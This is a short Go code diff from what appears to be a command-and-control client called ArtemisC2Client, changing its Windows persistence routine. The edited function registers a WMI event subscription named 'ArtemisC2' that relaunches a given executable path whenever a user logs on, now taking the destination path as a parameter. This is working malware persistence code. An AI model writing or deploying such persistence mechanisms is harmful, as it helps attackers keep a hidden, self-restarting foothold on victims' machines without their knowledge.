@@ -2,14 +2,13 @@ package persistence
 
 import (
 	"fmt"
-	"os"
 
 	"github.com/desertcod98/ArtemisC2Client/log"
 	"github.com/go-ole/go-ole"
 	"github.com/go-ole/go-ole/oleutil"
 )
 
-func tryInitWmi() bool {
+func tryInitWmi(destPath string) bool {
 	if err := ole.CoInitialize(0); err != nil {
 		log.Log(err.Error())
 	}
@@ -23,12 +22,7 @@ func tryInitWmi() bool {
 	eventNamespace := "root\\cimv2"
 	query := "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"
 
-	exePath, err := os.Executable()
-	if err != nil {
-		return false
-	}
-
-	if err := createSubscription(subSvc, "ArtemisC2", eventNamespace, query, exePath); err != nil {
+	if err := createSubscription(subSvc, "ArtemisC2", eventNamespace, query, destPath); err != nil {
 		log.Log("install failed: " + err.Error())
 		return false
 	}
